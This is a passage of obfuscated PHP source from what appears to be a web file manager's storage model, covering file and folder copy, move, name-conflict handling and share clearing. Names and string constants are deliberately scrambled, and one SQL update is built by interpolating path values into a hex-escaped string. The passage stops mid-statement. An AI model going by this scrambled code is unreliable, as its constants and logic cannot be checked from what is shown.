public function isParentOf($»Üè©‹, $¯øšÌü) { $«—–†çˆ =& $_SERVER[¼èá¯æÙ]; $äòÎú•÷ = $this->sourceInfo($»Üè©‹); $ì¨ÆŠÏ¨ = $this->sourceInfo($¯øšÌü); $›²Êè“ = $äòÎú•÷[$«—–†çˆ[595]] . $äòÎú•÷[$«—–†çˆ[203]] . $«—–†çˆ[50]; $ßŠÂÓ = $ì¨ÆŠÏ¨[$«—–†çˆ[595]] . $ì¨ÆŠÏ¨[$«—–†çˆ[203]] . $«—–†çˆ[50]; $Ò±’êñ = strpos($ßŠÂÓ, $›²Êè“) === 0; return $Ò±’êñ; } private $targetIsDelete = 0; public function copy($“¡¶”®, $ëì¿ÑŞı, $³øœ‘µ­ = REPEAT_REPLACE, $×²„¤ŠŠ = '') { $ŒÊ¨©¶È =& $_SERVER[¼èá¯æÙ]; $È¢‡‹¥‘ = $this->sourceInfo($“¡¶”®); $º·ú³È‘ = $this->sourceInfo($ëì¿ÑŞı); if (!$È¢‡‹¥‘ || !$º·ú³È‘ || $º·ú³È‘[$ŒÊ¨©¶È[496]] != $ŒÊ¨©¶È[101]) { return !1; } if ($this->isParentOf($“¡¶”®, $ëì¿ÑŞı)) { return !1; } $«ñ¡Êõ´ = $×²„¤ŠŠ ? $×²„¤ŠŠ : $È¢‡‹¥‘[$ŒÊ¨©¶È[32]]; $this->lockCopyStart($“¡¶”®); $this->lockWriteStart($ëì¿ÑŞı, $«ñ¡Êõ´); $©ÏÍ•° = array($ŒÊ¨©¶È[643] => array(), $ŒÊ¨©¶È[644] => array(), $ŒÊ¨©¶È[645] => array()); $this->targetIsDelete = intval($È¢‡‹¥‘[$ŒÊ¨©¶È[516]]); $±×ÔÃÈõ = $this->fileNameExistAuto($ëì¿ÑŞı, $È¢‡‹¥‘); $ÁÉ¬˜¥ö = $this->_copy($“¡¶”®, $ëì¿ÑŞı, $³øœ‘µ­, $©ÏÍ•°, !0, $×²„¤ŠŠ); $this->_childrenListClear(); $this->lockCopyEnd($“¡¶”®); $this->lockWriteEnd($ëì¿ÑŞı, $«ñ¡Êõ´); if ($È¢‡‹¥‘[$ŒÊ¨©¶È[496]] == $ŒÊ¨©¶È[101] && $±×ÔÃÈõ == $ÁÉ¬˜¥ö) { $this->folderSizeResetChildren($±×ÔÃÈõ); } Model($ŒÊ¨©¶È[646])->addAll($©ÏÍ•°[$ŒÊ¨©¶È[644]], array(), !0); if ($±×ÔÃÈõ != $ÁÉ¬˜¥ö || $È¢‡‹¥‘[$ŒÊ¨©¶È[496]] == $ŒÊ¨©¶È[101]) { Model($ŒÊ¨©¶È[647])->eventCopy($ÁÉ¬˜¥ö); } $this->saveAll($©ÏÍ•°[$ŒÊ¨©¶È[645]]); Model($ŒÊ¨©¶È[242])->linkAdd($©ÏÍ•°[$ŒÊ¨©¶È[643]]); $this->folderSizeReset($ëì¿ÑŞı); $this->updateModifyTime($ëì¿ÑŞı); return $ÁÉ¬˜¥ö; } private function _copy($àìé‹·â, $¡ İâÛ•, $Ó÷Ê°ñ, &$è‘™ß½÷, $â¯ëâ˜Æ, $™Ú„¬ı = '') { $¡â¹÷© =& $_SERVER[¼èá¯æÙ]; $Ú ’Š ñ = $this->sourceInfoCache($àìé‹·â); $ìºı™Ä = $Ú ’Š ñ[$¡â¹÷©[496]] == $¡â¹÷©[101]; $¯üõàğõ = $™Ú„¬ı ? $™Ú„¬ı : $Ú ’Š ñ[$¡â¹÷©[32]]; $ÀË¬¸òÚ = $this->fileNameExistAuto($¡ İâÛ•, $Ú ’Š ñ); if ($â¯ëâ˜Æ) { $this->_childrenAllMake($àìé‹·â); if ($ìºı™Ä && $ÀË¬¸òÚ) { $this->_childrenAllMake($ÀË¬¸òÚ); } } if (!$ÀË¬¸òÚ) { return $this->_copyCreate($àìé‹·â, $¡ İâÛ•, $¯üõàğõ, $è‘™ß½÷); } $ñ‚È´ëü = $ÀË¬¸òÚ; if ($ìºı™Ä) { if ($Ó÷Ê°ñ == REPEAT_RENAME_FOLDER) { $¯üõàğõ = $this->fileNameAutoCache($¡ İâÛ•, $¯üõàğõ, $Ó÷Ê°ñ, $ìºı™Ä); $ñ‚È´ëü = $this->_copyCreate($àìé‹·â, $¡ İâÛ•, $¯üõàğõ, $è‘™ß½÷); } else { $¤ÇüÏé“ = $this->_childrenList($àìé‹·â); foreach ($¤ÇüÏé“ as $¦Ö¿Î‹) { $this->_copy($¦Ö¿Î‹[$¡â¹÷©[203]], $ÀË¬¸òÚ, $Ó÷Ê°ñ, $è‘™ß½÷, !1); } } } else { if ($Ó÷Ê°ñ == REPEAT_RENAME || $Ó÷Ê°ñ == REPEAT_RENAME_FOLDER) { $¯üõàğõ = $this->fileNameAutoCache($¡ İâÛ•, $¯üõàğõ, $Ó÷Ê°ñ, $ìºı™Ä); $ñ‚È´ëü = $this->_copyCreate($àìé‹·â, $¡ İâÛ•, $¯üõàğõ, $è‘™ß½÷); } else { if ($Ó÷Ê°ñ == REPEAT_REPLACE) { $Ş³¢Ğ”‰ = $this->sourceInfoCache($ÀË¬¸òÚ); $ÙíÙïñÎ = $this->fileHistory($Ş³¢Ğ”‰, $Ú ’Š ñ[$¡â¹÷©[552]], $Ú ’Š ñ[$¡â¹÷©[89]]); if ($ÙíÙïñÎ) { $è‘™ß½÷[$¡â¹÷©[643]][] = $Ú ’Š ñ[$¡â¹÷©[552]]; } } else { if ($Ó÷Ê°ñ == REPEAT_SKIP) { } } } Hook::trigger($¡â¹÷©[648], array($¡â¹÷©[649], $Ú ’Š ñ, 0)); } return $ñ‚È´ëü; } private function _copyCreate($É¨´éƒÎ, $°Åœ¨¢Õ, $ŸûÀ£¾ˆ, &$Ô– ùÆ¾) { $› üüŸ® =& $_SERVER[¼èá¯æÙ]; $¬ûí³êŸ = $this->sourceInfoCache($É¨´éƒÎ); $ŞâÜ±à¡ = $this->sourceInfoCache($°Åœ¨¢Õ); $è•ó¬º¿ = $this->_makeItemData($¬ûí³êŸ, $ŞâÜ±à¡, $ŸûÀ£¾ˆ); Hook::trigger($› üüŸ®[650], $è•ó¬º¿); Hook::trigger($› üüŸ®[651], array($› üüŸ®[652], $è•ó¬º¿, 0)); $³…”ò¬µ = $this->add($è•ó¬º¿); $“ŒÊ¶ÓÕ = array($› üüŸ®[203] => $³…”ò¬µ, $› üüŸ®[32] => $ŸûÀ£¾ˆ); $this->_copyApplyMeta($“ŒÊ¶ÓÕ, $Ô– ùÆ¾); if ($¬ûí³êŸ[$› üüŸ®[496]] != $› üüŸ®[101]) { $Ô– ùÆ¾[$› üüŸ®[643]][] = $¬ûí³êŸ[$› üüŸ®[552]]; return $³…”ò¬µ; } $¡«Û›ñ¢ = array(); $ë˜İ’åÔ = array(); $this->_childrenListAll($É¨´éƒÎ, $¡«Û›ñ¢); $Ù©Á™À = count($¡«Û›ñ¢); if ($Ù©Á™À == 0) { return $³…”ò¬µ; } $„´Œ¾¨ = $this->sourceInfo($³…”ò¬µ); foreach ($¡«Û›ñ¢ as $İè‡‘») { $ø³Æ¼œˆ = $this->_makeItemData($İè‡‘», $„´Œ¾¨, $İè‡‘»[$› üüŸ®[32]]); $ø³Æ¼œˆ[$› üüŸ®[595]] = $İè‡‘»[$› üüŸ®[595]]; $ë˜İ’åÔ[] = $ø³Æ¼œˆ; } $this->chunkEventSet($› üüŸ®[653], array($› üüŸ®[654], $è•ó¬º¿, $Ù©Á™À)); $this->addAll($ë˜İ’åÔ, array(), !1); $ş™Ã·¨ş = $this->where(array($› üüŸ®[202] => $³…”ò¬µ))->select(); $¥İòÎ·ò = $this->_childrenMakeRelation($¡«Û›ñ¢, $ş™Ã·¨ş); $¥İòÎ·ò[$É¨´éƒÎ] = $³…”ò¬µ; $µ”Õ¶ = array(); $À£°ŠÎ = array(); foreach ($ş™Ã·¨ş as $İè‡‘») { $ºÖšáš™ = $İè‡‘»[$› üüŸ®[203]]; $´èë²Ë€ = $this->_childrenMatch($¥İòÎ·ò, $İè‡‘», $„´Œ¾¨); $µ”Õ¶[] = array($› üüŸ®[203], $ºÖšáš™, $› üüŸ®[202], $´èë²Ë€[$› üüŸ®[202]]); $À£°ŠÎ[] = array($› üüŸ®[203], $ºÖšáš™, $› üüŸ®[595], $´èë²Ë€[$› üüŸ®[595]]); $this->_copyApplyMeta($İè‡‘», $Ô– ùÆ¾); if ($İè‡‘»[$› üüŸ®[496]] != $› üüŸ®[101]) { $Ô– ùÆ¾[$› üüŸ®[643]][] = $İè‡‘»[$› üüŸ®[552]]; } } $this->chunkEventSet($› üüŸ®[655], array($› üüŸ®[656], $è•ó¬º¿, $Ù©Á™À)); $this->saveAll($µ”Õ¶); $this->chunkEventSet($› üüŸ®[657], array($› üüŸ®[658], $è•ó¬º¿, $Ù©Á™À)); $this->saveAll($À£°ŠÎ); return $³…”ò¬µ; } private function _childrenMakeRelation($¶ÚÊÃÛÊ, $ˆşù´¥Ù) { $ÚÙú×Æ¢ =& $_SERVER[¼èá¯æÙ]; $Šåõø” = array(); $½–¡›Ìú = array(); foreach ($¶ÚÊÃÛÊ as $ğ‚¬Ó»ï) { $ÅØ´ëâ­ = $ğ‚¬Ó»ï[$ÚÙú×Æ¢[32]] . $ÚÙú×Æ¢[8] . $ğ‚¬Ó»ï[$ÚÙú×Æ¢[595]]; $Šåõø”[$ÅØ´ëâ­] = $ğ‚¬Ó»ï[$ÚÙú×Æ¢[203]]; } foreach ($ˆşù´¥Ù as $ğ‚¬Ó»ï) { $ÅØ´ëâ­ = $ğ‚¬Ó»ï[$ÚÙú×Æ¢[32]] . $ÚÙú×Æ¢[8] . $ğ‚¬Ó»ï[$ÚÙú×Æ¢[595]]; $öãÃğ¡Ã = $Šåõø”[$ÅØ´ëâ­]; $½–¡›Ìú[$öãÃğ¡Ã] = $ğ‚¬Ó»ï[$ÚÙú×Æ¢[203]]; } return $½–¡›Ìú; } private function _childrenMatch($±³ù“Ş€, $‰“œ½€À, $éÉË™) { $¡”Ö×ó× =& $_SERVER[¼èá¯æÙ]; $ºåášÄõ = $éÉË™[$¡”Ö×ó×[595]]; $Ÿ™íÒñ“ = $this->parentLevelArray($‰“œ½€À[$¡”Ö×ó×[595]]); foreach ($Ÿ™íÒñ“ as $ËÓÑ“ú) { if (isset($±³ù“Ş€[$ËÓÑ“ú])) { $ºåášÄõ .= $±³ù“Ş€[$ËÓÑ“ú] . $¡”Ö×ó×[659]; } } $ºåášÄõ = rtrim($ºåášÄõ, $¡”Ö×ó×[50]) . $¡”Ö×ó×[50]; $èË€Á© = $this->parentLevelArray($ºåášÄõ); $÷ªÚñõ = $èË€Á©[count($èË€Á©) - 1]; return array($¡”Ö×ó×[202] => $÷ªÚñõ, $¡”Ö×ó×[595] => $ºåášÄõ); } private function _makeItemData($Òû²¼ÊÎ, $ï•ı†ô, $øÔÄ××ó) { $£êŒ²» =& $_SERVER[¼èá¯æÙ]; $ã¬ÛËœÕ = array($£êŒ²»[660] => $Òû²¼ÊÎ[$£êŒ²»[496]], $£êŒ²»[505] => $øÔÄ××ó, $£êŒ²»[661] => $Òû²¼ÊÎ[$£êŒ²»[497]] ? $Òû²¼ÊÎ[$£êŒ²»[497]] : $£êŒ²»[12], $£êŒ²»[553] => $Òû²¼ÊÎ[$£êŒ²»[552]] ? $Òû²¼ÊÎ[$£êŒ²»[552]] : 0, $£êŒ²»[631] => $Òû²¼ÊÎ[$£êŒ²»[89]] ? $Òû²¼ÊÎ[$£êŒ²»[89]] : 0, $£êŒ²»[662] => intval($ï•ı†ô[$£êŒ²»[200]]), $£êŒ²»[663] => intval($ï•ı†ô[$£êŒ²»[580]]), $£êŒ²»[664] => intval(USER_ID), $£êŒ²»[665] => intval(USER_ID), $£êŒ²»[488] => intval($ï•ı†ô[$£êŒ²»[203]]), $£êŒ²»[666] => $ï•ı†ô[$£êŒ²»[595]] . $ï•ı†ô[$£êŒ²»[203]] . $£êŒ²»[50], $£êŒ²»[509] => $Òû²¼ÊÎ[$£êŒ²»[98]] ? $Òû²¼ÊÎ[$£êŒ²»[98]] : time(), $£êŒ²»[515] => 0, $£êŒ²»[667] => $£êŒ²»[12]); return $ã¬ÛËœÕ; } private function _copyApplyMeta($ı±Ñå¿È, &$»éùïŒ¿) { $ôëêê·‘ =& $_SERVER[¼èá¯æÙ]; $¸Ì¦Ò‚ì = $ı±Ñå¿È[$ôëêê·‘[203]]; $ïù¥“ = $ı±Ñå¿È[$ôëêê·‘[32]]; if (!isset($ı±Ñå¿È[$ôëêê·‘[668]]) || !$ı±Ñå¿È[$ôëêê·‘[668]] || $ı±Ñå¿È[$ôëêê·‘[668]] == $ôëêê·‘[240]) { $»éùïŒ¿[$ôëêê·‘[645]][] = array($ôëêê·‘[203], $¸Ì¦Ò‚ì, $ôëêê·‘[668], short_id($¸Ì¦Ò‚ì)); } if (Input::check($ïù¥“, $ôëêê·‘[669])) { $»éùïŒ¿[$ôëêê·‘[644]][] = array($ôëêê·‘[203] => $¸Ì¦Ò‚ì, $ôëêê·‘[107] => $ôëêê·‘[549], $ôëêê·‘[462] => str_replace($ôëêê·‘[53], $ôëêê·‘[12], Pinyin::get($ïù¥“))); $»éùïŒ¿[$ôëêê·‘[644]][] = array($ôëêê·‘[203] => $¸Ì¦Ò‚ì, $ôëêê·‘[107] => $ôëêê·‘[548], $ôëêê·‘[462] => Pinyin::get($ïù¥“, $ôëêê·‘[670])); } $»éùïŒ¿[$ôëêê·‘[644]][] = array($ôëêê·‘[203] => $¸Ì¦Ò‚ì, $ôëêê·‘[107] => $ôëêê·‘[528], $ôëêê·‘[462] => KodSort::makeStr($ïù¥“)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($ŸÚÇãÌ«) { $ùÆ¾ğ©· =& $_SERVER[¼èá¯æÙ]; $°š…Úã” = $this->sourceInfo($ŸÚÇãÌ«); $£¸ÄŠÕ• = $ùÆ¾ğ©·[671]; $îƒÄ¿È¤ = array($ùÆ¾ğ©·[595] => array($ùÆ¾ğ©·[626], $°š…Úã”[$ùÆ¾ğ©·[595]] . $ŸÚÇãÌ« . $ùÆ¾ğ©·[627]), $ùÆ¾ğ©·[516] => $this->targetIsDelete); $¤¦¼ï‰­ = $this->field($£¸ÄŠÕ•)->where($îƒÄ¿È¤)->select(); if (!$¤¦¼ï‰­) { return; } $¤¦¼ï‰­ = array_to_keyvalue($¤¦¼ï‰­, $ùÆ¾ğ©·[203]); foreach ($¤¦¼ï‰­ as $”ä„µÂ) { $¬şÀşœ® = $”ä„µÂ[$ùÆ¾ğ©·[202]]; $ŸÚÇãÌ« = $”ä„µÂ[$ùÆ¾ğ©·[203]]; if (!isset($this->_childrenListCache[$ŸÚÇãÌ«]) && $”ä„µÂ[$ùÆ¾ğ©·[496]] == $ùÆ¾ğ©·[101]) { $this->_childrenListCache[$ŸÚÇãÌ«] = array(); } if (!isset($this->_childrenListCache[$¬şÀşœ®])) { $this->_childrenListCache[$¬şÀşœ®] = array(); } $this->_childrenListCache[$¬şÀşœ®][$ŸÚÇãÌ«] = $”ä„µÂ; $this->_childrenItemCache[$ŸÚÇãÌ«] = $”ä„µÂ; } } private function _childrenListAll($˜§¸Œœ–, &$¾¦ˆÒ©˜) { $ş÷›®‰Û =& $_SERVER[¼èá¯æÙ]; if (!isset($this->_childrenListCache[$˜§¸Œœ–])) { return; } $¸ä†û’• = $this->_childrenListCache[$˜§¸Œœ–]; foreach ($¸ä†û’• as $†Ø°ˆãÊ => $ ¹Îúë) { $¾¦ˆÒ©˜[$†Ø°ˆãÊ] = $ ¹Îúë; if ($ ¹Îúë[$ş÷›®‰Û[496]] == $ş÷›®‰Û[101]) { $this->_childrenListAll($†Ø°ˆãÊ, $¾¦ˆÒ©˜); } } } private function sourceInfoCache($™…íÒº‚) { if (isset($this->_childrenItemCache[$™…íÒº‚])) { return $this->_childrenItemCache[$™…íÒº‚]; } return $this->sourceInfo($™…íÒº‚); } private function _childrenList($Š™œÁ³Ø) { if (isset($this->_childrenListCache[$Š™œÁ³Ø])) { return $this->_childrenListCache[$Š™œÁ³Ø]; } return $this->_childrenListSelect($Š™œÁ³Ø); } private function _childrenListSelect($¥€÷ıÌ™) { $ß™€áßÂ =& $_SERVER[¼èá¯æÙ]; $’ì×½¦¿ = array($ß™€áßÂ[202] => $¥€÷ıÌ™, $ß™€áßÂ[516] => $this->targetIsDelete); $ùÎªåä˜ = $this->where($’ì×½¦¿)->select(); $ùÎªåä˜ = $ùÎªåä˜ ? $ùÎªåä˜ : array(); $ÒÂ×¸°— = array_to_keyvalue($ùÎªåä˜, $ß™€áßÂ[203]); $this->_childrenListCache[$¥€÷ıÌ™] = $ÒÂ×¸°—; foreach ($ÒÂ×¸°— as $¥€÷ıÌ™ => $É²Ğ¾Ëâ) { $this->_childrenItemCache[$¥€÷ıÌ™] = $É²Ğ¾Ëâ; } return $ÒÂ×¸°—; } private function fileNameExistAuto($Ñ”Ä˜û®, $éé˜ÊÆœ) { $êÈÁŸ›Ê =& $_SERVER[¼èá¯æÙ]; if ($éé˜ÊÆœ[$êÈÁŸ›Ê[516]] == $êÈÁŸ›Ê[101]) { return $this->fileNameExist($Ñ”Ä˜û®, $éé˜ÊÆœ[$êÈÁŸ›Ê[32]]); } return $this->fileNameExistCache($Ñ”Ä˜û®, $éé˜ÊÆœ[$êÈÁŸ›Ê[32]]); } private function fileNameExistCache($ò—Ø÷ŸŒ, $ÅĞÔÌÃ) { $Ç¥ëéÙ® =& $_SERVER[¼èá¯æÙ]; $ÅĞÔÌÃ = strtolower($ÅĞÔÌÃ); $›Õşı¼Ï = $this->_childrenList($ò—Ø÷ŸŒ); foreach ($›Õşı¼Ï as $°–«…Š) { if ($ÅĞÔÌÃ == strtolower($°–«…Š[$Ç¥ëéÙ®[32]])) { return $°–«…Š[$Ç¥ëéÙ®[203]]; } } return !1; } private function fileNameAutoCache($ùíŒôà°, $©×±ùó, $İõ¬³“², $éãëÔ½€) { $¤Ó—¨‡ =& $_SERVER[¼èá¯æÙ]; $ú¶ùĞº = $this->_childrenList($ùíŒôà°); $Š€‹ˆÀ = array_to_keyvalue($ú¶ùĞº, $¤Ó—¨‡[12], $¤Ó—¨‡[32]); return $this->fileNameAutoGet($Š€‹ˆÀ, $©×±ùó, $İõ¬³“², $éãëÔ½€); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($ÈÓØÆš, $ô¬ïûäñ, $ÛİÁ›Š = REPEAT_REPLACE, $–ñˆ¡·Ù = '') { $ãçúÈù =& $_SERVER[¼èá¯æÙ]; $°ÉüÏœ = $this->sourceInfo($ÈÓØÆš); $ä„ÑïÇ = $this->sourceInfo($ô¬ïûäñ); if ($°ÉüÏœ[$ãçúÈù[202]] == $ä„ÑïÇ[$ãçúÈù[203]]) { if ($°ÉüÏœ[$ãçúÈù[516]] == $ãçúÈù[101]) { Model($ãçúÈù[514])->restore(array($ÈÓØÆš)); } if (!$–ñˆ¡·Ù || $–ñˆ¡·Ù == $°ÉüÏœ[$ãçúÈù[32]]) { return $ÈÓØÆš; } } $‚¿²¥›Ş = $this->pathInfoMore($ÈÓØÆš); if ($this->isParentOf($ÈÓØÆš, $ô¬ïûäñ)) { return !1; } if (!$°ÉüÏœ || !$ä„ÑïÇ || $ä„ÑïÇ[$ãçúÈù[496]] != $ãçúÈù[101]) { return !1; } Hook::trigger($ãçúÈù[672], $‚¿²¥›Ş); $this->targetIsDelete = intval($°ÉüÏœ[$ãçúÈù[516]]); if ($°ÉüÏœ[$ãçúÈù[202]] == $ô¬ïûäñ && $–ñˆ¡·Ù != $°ÉüÏœ[$ãçúÈù[32]]) { $ËîşÕìë = $this->fileNameExist($ô¬ïûäñ, $–ñˆ¡·Ù); if ($ËîşÕìë && $°ÉüÏœ[$ãçúÈù[496]] == $ãçúÈù[240]) { $ªŠç¡éö = $this->sourceInfo($ËîşÕìë); $ŞÕÜåñè = $this->fileHistory($ªŠç¡éö, $°ÉüÏœ[$ãçúÈù[552]], $°ÉüÏœ[$ãçúÈù[89]]); if (!$ŞÕÜåñè) { Model($ãçúÈù[555])->remove($°ÉüÏœ[$ãçúÈù[552]]); } $this->removeNow($ÈÓØÆš, !1); $this->folderSizeReset($ô¬ïûäñ); Hook::trigger($ãçúÈù[673], $‚¿²¥›Ş); return $ËîşÕìë; } } $¢èÂ‡×µ = $–ñˆ¡·Ù ? $–ñˆ¡·Ù : $°ÉüÏœ[$ãçúÈù[32]]; $this->lockMoveStart($ÈÓØÆš); $this->lockWriteStart($ô¬ïûäñ, $¢èÂ‡×µ); $Ÿö©¿Éü = array($ãçúÈù[643] => array(), $ãçúÈù[674] => !1); $this->clearShare($ÈÓØÆš, $ô¬ïûäñ); $Ó¢ØöçÀ = $this->fileNameExistAuto($ô¬ïûäñ, $°ÉüÏœ); $±áúîÅ½ = $this->_move($ÈÓØÆš, $ô¬ïûäñ, $ÛİÁ›Š, $Ÿö©¿Éü, $–ñˆ¡·Ù); $this->sourceCacheClear(); if ($°ÉüÏœ[$ãçúÈù[496]] == $ãçúÈù[101] && $Ó¢ØöçÀ) { $this->folderSizeResetChildren($±áúîÅ½); } Model($ãçúÈù[242])->linkAdd($Ÿö©¿Éü[$ãçúÈù[643]]); if ($±áúîÅ½ && $Ó¢ØöçÀ && $Ÿö©¿Éü[$ãçúÈù[674]]) { $«ƒ¼‚î = $°ÉüÏœ[$ãçúÈù[496]] == $ãçúÈù[101] ? $this->_childrenListSelect($ÈÓØÆš) : !1; $ãÖ–ªÊ = $«ƒ¼‚î && count($«ƒ¼‚î) > 0 ? !0 : !1; $this->removeNow($ÈÓØÆš, $ãÖ–ªÊ); } $this->lockMoveEnd($ÈÓØÆš); $this->lockWriteEnd($ô¬ïûäñ, $¢èÂ‡×µ); $this->folderSizeReset($°ÉüÏœ[$ãçúÈù[202]]); $this->folderSizeReset($ô¬ïûäñ); $ÁÏ•çÂÌ = array($°ÉüÏœ[$ãçúÈù[202]], $ô¬ïûäñ); if ($°ÉüÏœ[$ãçúÈù[496]] == $ãçúÈù[101]) { $ÁÏ•çÂÌ[] = $ÈÓØÆš; } $this->updateModifyTime($ÁÏ•çÂÌ); Model($ãçúÈù[647])->eventMove($ÈÓØÆš, $°ÉüÏœ[$ãçúÈù[202]], $ô¬ïûäñ); Hook::trigger($ãçúÈù[673], $‚¿²¥›Ş); return $±áúîÅ½; } private function _move($ˆíÎïÌ, $ªúÍò™Õ, $·­¹É÷¼, &$çÁ ûÈĞ, $¢ö¨ñ²ä = '') { $û§ÊâğË =& $_SERVER[¼èá¯æÙ]; $ÖÚÑŒ» = $this->sourceInfo($ˆíÎïÌ); $‡¯øˆÌ² = $ÖÚÑŒ»[$û§ÊâğË[496]] == $û§ÊâğË[101]; $±»ÒÃğ = $¢ö¨ñ²ä ? $¢ö¨ñ²ä : $ÖÚÑŒ»[$û§ÊâğË[32]]; $»Û‡—¥Â = $this->fileNameExistAuto($ªúÍò™Õ, $ÖÚÑŒ»); $this->lockMoveStart($ˆíÎïÌ); $this->lockWriteStart($ªúÍò™Õ, $±»ÒÃğ); if (!$»Û‡—¥Â) { return $this->_moveForce($ˆíÎïÌ, $ªúÍò™Õ, $±»ÒÃğ); } $å…è®ßø = $»Û‡—¥Â; $á³£¯£§ = !1; if ($‡¯øˆÌ²) { if ($·­¹É÷¼ == REPEAT_RENAME_FOLDER) { $±»ÒÃğ = $this->fileNameAuto($ªúÍò™Õ, $±»ÒÃğ, $·­¹É÷¼, $‡¯øˆÌ²); $å…è®ßø = $this->_moveForce($ˆíÎïÌ, $ªúÍò™Õ, $±»ÒÃğ); } else { $ÙÒ¶§Ğ÷ = $this->_childrenListSelect($ˆíÎïÌ); foreach ($ÙÒ¶§Ğ÷ as $•†å€×Ş) { $Å£Ñ¹„€ = REPEAT_REPLACE; $this->_move($•†å€×Ş[$û§ÊâğË[203]], $»Û‡—¥Â, $Å£Ñ¹„€, $çÁ ûÈĞ); } $á³£¯£§ = !0; } } else { if ($·­¹É÷¼ == REPEAT_RENAME || $·­¹É÷¼ == REPEAT_RENAME_FOLDER) { $±»ÒÃğ = $this->fileNameAuto($ªúÍò™Õ, $±»ÒÃğ, $·­¹É÷¼, $‡¯øˆÌ²); $å…è®ßø = $this->_moveForce($ˆíÎïÌ, $ªúÍò™Õ, $±»ÒÃğ); } else { $˜Ê°ü = $this->sourceInfoCache($»Û‡—¥Â); $°ÌÚ¥‰‡ = $this->fileHistory($˜Ê°ü, $ÖÚÑŒ»[$û§ÊâğË[552]], $ÖÚÑŒ»[$û§ÊâğË[89]]); if ($°ÌÚ¥‰‡) { $çÁ ûÈĞ[$û§ÊâğË[643]][] = $ÖÚÑŒ»[$û§ÊâğË[552]]; } $á³£¯£§ = !0; } } if ($á³£¯£§) { $çÁ ûÈĞ[$û§ÊâğË[674]] = !0; } return $å…è®ßø; } private function _moveForce($€¾ë¯Şş, $¯¯„İşÖ, $ Í£¬øı) { $‹ö¦—¸“ =& $_SERVER[¼èá¯æÙ]; $Ìğ°ñ“ = $this->sourceInfo($€¾ë¯Şş); $ïì¥¢« = $this->sourceInfo($¯¯„İşÖ); $ùú–å¶æ = $Ìğ°ñ“[$‹ö¦—¸“[496]] == $‹ö¦—¸“[101]; $ãá»àÏÀ = array($‹ö¦—¸“[488] => $ïì¥¢«[$‹ö¦—¸“[203]], $‹ö¦—¸“[666] => $ïì¥¢«[$‹ö¦—¸“[595]] . $ïì¥¢«[$‹ö¦—¸“[203]] . $‹ö¦—¸“[50], $‹ö¦—¸“[662] => $ïì¥¢«[$‹ö¦—¸“[200]], $‹ö¦—¸“[663] => $ïì¥¢«[$‹ö¦—¸“[580]], $‹ö¦—¸“[665] => USER_ID, $‹ö¦—¸“[505] => $ Í£¬øı); $×§˜ØÙ = $Ìğ°ñ“[$‹ö¦—¸“[200]] == SourceModel::TYPE_GROUP && $ïì¥¢«[$‹ö¦—¸“[200]] == SourceModel::TYPE_GROUP && $Ìğ°ñ“[$‹ö¦—¸“[580]] == $ïì¥¢«[$‹ö¦—¸“[580]]; if (!$×§˜ØÙ && $this->moveClearAuth) { Model($‹ö¦—¸“[578])->authClear($€¾ë¯Şş); } $İ ­²™ = $Ìğ°ñ“[$‹ö¦—¸“[516]] == $‹ö¦—¸“[101] && $ïì¥¢«[$‹ö¦—¸“[516]] != $‹ö¦—¸“[101]; if ($İ ­²™) { $ãá»àÏÀ[$‹ö¦—¸“[515]] = 0; } if ($ùú–å¶æ) { $õü°ü¤Š = array($‹ö¦—¸“[666] => array($‹ö¦—¸“[626], $Ìğ°ñ“[$‹ö¦—¸“[595]] . $Ìğ°ñ“[$‹ö¦—¸“[203]] . $‹ö¦—¸“[627])); $Ä¿î×Ô³ = $Ìğ°ñ“[$‹ö¦—¸“[595]] . $Ìğ°ñ“[$‹ö¦—¸“[203]] . $‹ö¦—¸“[50]; $·şôâĞ = $ïì¥¢«[$‹ö¦—¸“[595]] . $ïì¥¢«[$‹ö¦—¸“[203]] . $‹ö¦—¸“[50] . $Ìğ°ñ“[$‹ö¦—¸“[203]] . $‹ö¦—¸“[50]; $±÷ö¥† = array($‹ö¦—¸“[666] => array($‹ö¦—¸“[675], "\x72\145\x70\154\x61\x63\x65\x28\160\x61\x72\x65\156\164\x4c\x65\x76\145\154\54\x27{$Ä¿î×Ô³}\47\x2c\47{$·şôâĞ}\x27\51"), $‹ö¦—¸“[662] => $ïì¥¢«[$‹ö¦—¸“[200]], $‹ö¦—¸“[663] => $ïì¥¢«[$‹ö¦—¸“[580]]); if ($İ ­²™) { $±÷ö¥†[$‹ö¦—¸“[515]] = 0; } $this->where($õü°ü¤Š)->data($±÷ö¥†)->save(); } $this->where(array($‹ö¦—¸“[502] => $€¾ë¯Şş))->data($ãá»àÏÀ)->save(); return $€¾ë¯Şş; } private function clearShare($´š•ÎïÜ, $œÏ‹Û¦) { $²ı¦—õ =& $_SERVER[¼èá¯æÙ]; $êŠÙôš„ = $this->sourceInfo($´š•ÎïÜ); $Ã ´ğØÓ = $this->sourceInfo($œÏ‹Û¦); if ($êŠÙôš„[$²ı¦—õ[580]] == $Ã ´ğØÓ[$²ı¦—õ[580]] && $êŠÙôš„[$²ı¦—õ[200]] == $²ı¦—õ[676]) { return; } $ÆºêÚµé = array($²ı¦—õ[595] => array($²ı¦—õ[626], $êŠÙôš„[$²ı¦—õ[595]] . $´š•ÎïÜ . $²ı¦—õ[627])); $¼¦şŒ» = $this->field($²ı¦—õ[502])->where($ÆºêÚµé)->getField($²ı¦—õ[203], !0); if (!$¼¦şŒ») { return; } $ÆºêÚµé = array($²ı¦—õ[203] => array($²ı¦—õ[7], $¼¦şŒ»), $²ı¦—õ[677] => 1); $ä÷ã¡ÀÎ = Model($²ı¦—õ[678])->field($²ı¦—õ[679])->where($ÆºêÚµé)->select(); if (!$ä÷ã¡ÀÎ) { return; } $ä÷ã¡ÀÎ = array_to_keyvalue($ä÷ã¡ÀÎ, $²ı¦—õ[12], $²ı¦—õ[679]); $ÆºêÚµé = array($²ı¦—õ[679] => array($²ı¦—õ[7], $ä÷ã¡ÀÎ)); Model($²ı¦—õ[678])->where($ÆºêÚµé)->save(array($²ı¦—õ[677] => 0)); Model($²ı¦—õ[680])->where($ÆºêÚµé)->delete(); } public function copyFolderFromIO($Ü¤‰ƒë‚, $µ–ò·Ò, $¯–öô”, $ë—˜Ş, $ğ«Â‚’‡, $úÅ¯³€¥ = false) { $êÊãìæ =& $_SERVER[¼èá¯æÙ]; $ÈÉ·ºñı = array($êÊãìæ[644] => array(), $êÊãìæ[645] => array(), $êÊãìæ[643] => array(), $êÊãìæ[681] => array()); $æêÉ‘‰è = 